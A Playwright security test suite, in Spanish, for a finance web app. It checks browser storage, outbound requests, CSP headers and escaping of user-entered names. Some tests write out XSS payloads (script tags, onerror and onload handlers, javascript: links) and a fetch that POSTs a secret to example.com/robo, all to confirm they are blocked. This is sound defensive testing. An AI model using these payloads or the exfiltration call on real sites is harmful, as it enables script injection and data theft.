/**
 * Lo que el sitio guarda, a dónde habla y qué deja ejecutar. Todo sobre el
 * sitio exportado y servido con sus cabeceras definitivas.
 */
import { expect, test, type Request } from '@playwright/test';

import { sembrarTodo, type Dispositivo } from '@/pruebas/sincronizacionDePrueba';

import {
  altaEnNode,
  altaEnWeb,
  anotarGasto,
  CONTRASENA,
  correoDePrueba,
  crearPrimeraCuenta,
  dispositivoDeNode,
  entrarEnWeb,
  esperarDentro,
  esperarFilasRemotas,
  exportarDesdeLaWeb,
  SITIO,
  URL_LOCAL,
  irA,
  vigilar,
  volcarAlmacenes,
} from './apoyo';

/** Las formas en que un secreto binario podría acabar escrito en algún sitio. */
function formasDe(base64url: string): string[] {
  const bytes = Buffer.from(base64url, 'base64url');
  return [base64url, bytes.toString('base64'), bytes.toString('hex'), bytes.toString('latin1')];
}

test('tras entrar y usar la app, el navegador no guarda la contraseña, ninguna clave ni ningún dato', async ({
  page,
  context,
}) => {
  const correo = correoDePrueba('almacenes');
  const nativo = await dispositivoDeNode();
  await altaEnNode(nativo, correo);
  await sembrarTodo(nativo as unknown as Dispositivo);
  await nativo.motor.subirLoLocal();
  await nativo.motor.ciclo();
  const claveDeDatos = nativo.claveDeDatos();
  expect(claveDeDatos).toHaveLength(43);

  await entrarEnWeb(page, correo);
  await esperarDentro(page);
  // Uso de verdad: listas, un alta y una exportación (que crea un fichero en memoria).
  for (const pestana of ['movimientos', 'analisis', 'plan', 'cuentas', 'index']) {
    await irA(page, pestana);
  }
  await anotarGasto(page, ['1', '9', 'decimal', '9', '9'], 'Compra secreta');
  const { datos: exportado } = await exportarDesdeLaWeb(page);
  await esperarFilasRemotas(correo, 20);

  // Valores que no pueden aparecer en ningún almacén.
  const prohibidos = new Set<string>([CONTRASENA, 'Compra secreta', ...formasDe(claveDeDatos)]);
  for (const filas of Object.values(exportado.tablas)) {
    for (const fila of filas) {
      for (const [columna, valor] of Object.entries(fila)) {
        // Los ids no son un dato financiero; los valores muy cortos salen por azar.
        if (columna === 'id' || valor === null || String(valor).length < 5) continue;
        // El correo sí se guarda (está permitido): un valor que sea parte de él no cuenta.
        if (correo.includes(String(valor))) continue;
        prohibidos.add(String(valor));
      }
    }
  }
  expect(prohibidos.size).toBeGreaterThan(40);
  expect(prohibidos).toContain('Mercado');
  expect(prohibidos).toContain('215000');

  const almacenes = await volcarAlmacenes(page);
  const cookies = await context.cookies();

  // Lo único guardado: el correo y, si se eligió, la apariencia.
  expect(almacenes.localStorage).toEqual({ 'fc.correo': correo });
  expect(almacenes.sessionStorage).toEqual({});
  expect(almacenes.cookies).toBe('');
  expect(cookies).toEqual([]);
  expect(almacenes.indexedDB).toEqual({});
  expect(almacenes.cacheStorage).toEqual({});
  expect(almacenes.serviceWorkers).toBe(0);

  // OPFS: solo la reserva vacía que crea expo-sqlite. Se lee byte a byte.
  expect(almacenes.opfs.length).toBeGreaterThan(0);
  for (const fichero of almacenes.opfs) {
    expect(fichero.ruta).toMatch(/^\/expo-sqlite\/[a-z0-9]+$/);
    expect(fichero.bytes).toBe(4096);
    // Sin contenido: como mucho unos bytes de cabecera, y ninguno es texto.
    expect(fichero.distintosDeCero).toBeLessThanOrEqual(16);
  }

  const todo = JSON.stringify({ ...almacenes, cookies });
  for (const valor of prohibidos) {
    expect(todo.includes(valor), `«${valor.slice(0, 20)}…» está en algún almacén`).toBe(false);
  }
  // Tampoco un token de sesión ni un sobre de fila.
  expect(todo).not.toMatch(/access_token|refresh_token|eyJ[A-Za-z0-9_-]{20,}/);
  const sesion = JSON.parse(nativo.sesion()) as { access_token: string };
  expect(sesion.access_token.length).toBeGreaterThan(40);
});

test('ninguna petición sale hacia un origen ajeno, y ninguna lleva datos en claro', async ({
  page,
}) => {
  const peticiones: Request[] = [];
  page.on('request', (peticion) => peticiones.push(peticion));
  const correo = correoDePrueba('red');
  await altaEnWeb(page, correo);
  await crearPrimeraCuenta(page, 'Banco Reservado', '9.876,54');
  await anotarGasto(page, ['3', '3', 'decimal', '3', '3'], 'Farmacia discreta');
  for (const pestana of ['movimientos', 'analisis', 'plan', 'cuentas', 'index']) {
    await irA(page, pestana);
  }
  await page.getByTestId('boton-ajustes').click();
  await page.getByTestId('ajuste-privacidad').click();
  await expect(page.getByTestId('pagina-privacidad')).toBeVisible();
  await esperarFilasRemotas(correo, 11);

  // Solo dos destinos: el propio sitio y Supabase. (Los blob: y data: no salen a la red.)
  const origenes = new Set(
    peticiones
      .map((p) => p.url())
      .filter((url) => /^https?:/.test(url))
      .map((url) => new URL(url).origin),
  );
  expect([...origenes].sort()).toEqual([SITIO, new URL(URL_LOCAL).origin].sort());

  // Lo que va a Supabase no lleva nada legible.
  const aSupabase = peticiones.filter((p) => p.url().startsWith(URL_LOCAL));
  expect(aSupabase.length).toBeGreaterThanOrEqual(4);
  const enviado = aSupabase
    .map((p) => `${decodeURIComponent(p.url())}\n${p.postData() ?? ''}`)
    .join('\n');
  for (const valor of [CONTRASENA, 'Banco Reservado', 'Farmacia discreta', '987654', '3333']) {
    expect(enviado.includes(valor), `«${valor}» ha salido en claro`).toBe(false);
  }
  // Las filas viajan como sobres: solo metadatos y contenido cifrado.
  const subidas = aSupabase.filter(
    (p) => p.method() === 'POST' && p.url().includes('/rest/v1/fila_cifrada'),
  );
  expect(subidas.length).toBeGreaterThan(0);
  for (const subida of subidas) {
    for (const fila of JSON.parse(subida.postData() ?? '[]') as Record<string, unknown>[]) {
      expect(Object.keys(fila).sort()).toEqual([
        'borrada',
        'contenido',
        'id',
        'tabla',
        'user_id',
        'version_de_formato',
      ]);
      expect(fila.contenido).toMatch(/^[A-Za-z0-9_-]{55,}$/);
    }
  }
  // Al sitio propio solo se le piden ficheros: ninguna petición con cuerpo.
  const alSitio = peticiones.filter((p) => p.url().startsWith(SITIO));
  expect(alSitio.every((p) => p.method() === 'GET' && p.postData() === null)).toBe(true);
});

test('la política de seguridad está activa: nada en línea se ejecuta y no hay violaciones en un recorrido completo', async ({
  page,
}) => {
  const consola = vigilar(page);
  const respuesta = await page.goto('/');
  const cabeceras = respuesta!.headers();
  const csp = cabeceras['content-security-policy'];
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("script-src 'self' 'wasm-unsafe-eval'");
  expect(csp).toContain(`connect-src 'self' ${new URL(URL_LOCAL).origin}`);
  expect(csp).toContain("frame-ancestors 'none'");
  // Ninguna de las tres puertas anchas.
  expect(csp).not.toMatch(/'unsafe-inline'|'unsafe-eval'|\*|https:(?!\/\/)|data:/);
  expect(cabeceras['strict-transport-security']).toMatch(/max-age=\d{8}/);
  expect(cabeceras['x-content-type-options']).toBe('nosniff');
  expect(cabeceras['referrer-policy']).toBe('no-referrer');
  expect(cabeceras['x-frame-options']).toBe('DENY');
  expect(cabeceras['cross-origin-opener-policy']).toBe('same-origin');
  expect(cabeceras['cross-origin-embedder-policy']).toBe('require-corp');
  expect(cabeceras['permissions-policy']).toContain('camera=()');
  expect(cabeceras['cache-control']).toBe('no-store');
  // El HTML no trae ningún script ni estilo en línea.
  const html = await respuesta!.text();
  expect(html).not.toMatch(/<script(?![^>]*\ssrc=)[^>]*>/);
  expect(html).not.toMatch(/<style|<[^>]*\son[a-z]+\s*=|(href|src)\s*=\s*["']?\s*javascript:/i);

  // Recorrido completo con la política puesta.
  const correo = correoDePrueba('csp');
  await altaEnWeb(page, correo);
  await crearPrimeraCuenta(page, 'Cuenta', '100,00');
  await anotarGasto(page, ['5'], 'Pan');
  for (const pestana of ['movimientos', 'analisis', 'plan', 'cuentas', 'index']) {
    await irA(page, pestana);
  }
  await exportarDesdeLaWeb(page);

  // El recorrido completo, con la política puesta, no ha producido ni una violación ni un error.
  expect(consola).toEqual([]);

  // Un atacante que consiguiera meter marcado en la página no ejecuta nada.
  const violaciones = await page.evaluate(async () => {
    const vistas: string[] = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      vistas.push(`${e.violatedDirective}|${e.blockedURI}`);
    });
    const guion = document.createElement('script');
    guion.textContent = 'window.__inyectado = "script en línea"';
    document.body.appendChild(guion);
    const ajeno = document.createElement('script');
    ajeno.src = 'https://example.com/malo.js';
    document.body.appendChild(ajeno);
    const imagen = document.createElement('div');
    imagen.innerHTML = '<img src="x" onerror="window.__inyectado = \'onerror\'">';
    document.body.appendChild(imagen);
    const enlace = document.createElement('a');
    enlace.href = 'javascript:window.__inyectado="enlace"';
    document.body.appendChild(enlace);
    enlace.click();
    // `eval` no se puede probar llamándolo desde aquí: las herramientas de automatización
    // evalúan por un canal propio que la política no cubre. Un temporizador con texto sí
    // lo compila la página, y la política lo trata igual que a `eval`.
    setTimeout('window.__evaluado = 1', 0);
    let salida = 'bloqueada';
    try {
      await fetch('https://example.com/robo', { method: 'POST', body: 'clave' });
      salida = 'HA SALIDO';
    } catch {
      // Es lo esperado: connect-src no lo permite.
    }
    await new Promise((seguir) => setTimeout(seguir, 500));
    return {
      inyectado: (window as unknown as { __inyectado?: string }).__inyectado ?? null,
      evaluado: (window as unknown as { __evaluado?: number }).__evaluado ?? 'bloqueado',
      salida,
      vistas,
    };
  });
  expect(violaciones.inyectado).toBeNull();
  expect(violaciones.evaluado).toBe('bloqueado');
  expect(violaciones.salida).toBe('bloqueada');
  expect(violaciones.vistas.join(' ')).toContain('script-src');
  expect(violaciones.vistas.join(' ')).toContain('connect-src');

  // Y cada intento quedó registrado por el navegador como violación.
  expect(consola.filter((linea) => /Content Security Policy/i.test(linea)).length).toBeGreaterThan(
    3,
  );
});

test('un nombre con HTML o script se muestra como texto y no se ejecuta', async ({ page }) => {
  const correo = correoDePrueba('html');
  await altaEnWeb(page, correo);
  const cuenta = '<b>Banco</b><img src=x onerror="window.__xss=1">';
  const gasto = '<script>window.__xss=2</script><svg onload="window.__xss=3">';
  await crearPrimeraCuenta(page, cuenta, '10,00');
  await anotarGasto(page, ['1'], gasto);
  for (const pestana of ['movimientos', 'cuentas', 'analisis', 'index', 'movimientos']) {
    await irA(page, pestana);
  }
  // Se ve tal cual se escribió, con sus signos.
  await expect(page.getByText(gasto, { exact: true }).first()).toBeVisible();
  await page.getByTestId('pestana-cuentas').click();
  await expect(page.getByText(cuenta, { exact: true }).first()).toBeVisible();
  const resultado = await page.evaluate(() => ({
    xss: (window as unknown as { __xss?: number }).__xss ?? null,
    imagenes: document.querySelectorAll('img[src="x"]').length,
    guiones: [...document.querySelectorAll('script')].filter((s) => !s.src).length,
    svg: document.querySelectorAll('svg[onload]').length,
  }));
  expect(resultado).toEqual({ xss: null, imagenes: 0, guiones: 0, svg: 0 });
  // Y viaja y vuelve igual: tras recargar y entrar, sigue siendo texto.
  await esperarFilasRemotas(correo, 11);
  await page.reload();
  await entrarEnWeb(page, correo, CONTRASENA, { yaEnLaPagina: true });
  await esperarDentro(page);
  await page.getByTestId('pestana-movimientos').click();
  await expect(page.getByText(gasto, { exact: true }).first()).toBeVisible();
  expect(
    await page.evaluate(() => (window as unknown as { __xss?: number }).__xss ?? null),
  ).toBeNull();
});
